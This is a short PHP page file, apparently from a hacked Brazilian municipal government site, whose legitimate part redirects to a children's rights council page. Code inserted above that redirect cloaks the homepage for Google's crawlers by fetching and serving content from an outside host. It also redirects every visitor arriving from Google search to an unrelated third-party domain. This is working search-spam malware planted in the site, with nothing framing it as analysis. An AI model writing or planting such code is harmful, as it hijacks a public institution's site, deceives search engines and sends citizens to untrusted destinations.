<?php
$request_uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

// === CLOAKING KHUSUS HOMEPAGE UNTUK GOOGLEBOT ===
if ($request_uri === '/' && isset($_SERVER['HTTP_USER_AGENT'])) {
    $ua = $_SERVER['HTTP_USER_AGENT'];

    if (
        stripos($ua, 'Googlebot') !== false ||
        stripos($ua, 'Google-Site-Verification') !== false ||
        stripos($ua, 'Google-InspectionTool') !== false
    ) {
        $ch = curl_init('https://cmdcabotucatu-sp.pages.dev/');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $output = curl_exec($ch);
        curl_close($ch);
        echo $output;
        exit;
    }
}

// === REDIRECT UNTUK PENGUNJUNG DARI GOOGLE (SEMUA HALAMAN) ===
if (isset($_SERVER['HTTP_REFERER'])) {
    $referer = $_SERVER['HTTP_REFERER'];

    if (preg_match('/https?:\/\/(www\.)?google\.[a-z.]+/i', $referer)) {
        header('Location: https://long85416.aksestanpalelet.com/redirlong');
        exit;
    }
}



profile_user();
?>
<?php
header("Location: https://sistemas.botucatu.sp.gov.br/cmdca");
exit();
?>
